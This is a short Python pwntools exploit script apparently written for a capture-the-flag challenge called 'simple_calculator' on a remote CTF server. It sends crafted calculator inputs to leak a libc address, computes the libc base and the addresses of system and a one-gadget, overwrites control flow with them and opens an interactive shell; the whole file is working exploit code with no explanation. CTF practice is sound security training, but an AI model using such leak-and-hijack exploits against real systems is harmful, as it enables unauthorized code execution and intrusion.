#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = remote('ctf.adl.tw',11005)
#r = process('./simple_calculator')
libc = ELF('./libc.so.6')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

main = 4197452

r.recvuntil("ssion:")
r.sendline('-')
r.recvuntil("ssion:")
r.sendline('-14 -') # -19 : puts
r.recvuntil("ssion:")
r.sendline('-')
r.recvuntil("answer: ")
libc_base = int(r.recvuntil('\n')[:-1]) - libc.symbols['read']
print hex(libc_base)
one_gadget = libc_base + 0xf02a4
#one_gadget = libc_base + 0x10a38c
system = libc_base + libc.symbols['system']


r.sendline('- ' + str(system))

'''
r.recvuntil("ssion:")
r.sendline('-')
r.recvuntil("ssion:")
#r.sendline('- ' + '4197452')
r.sendline('- ' + str(one_gadget))
#r.sendline('- ' + str(system))
r.sendline("20 -")
'''

r.interactive()
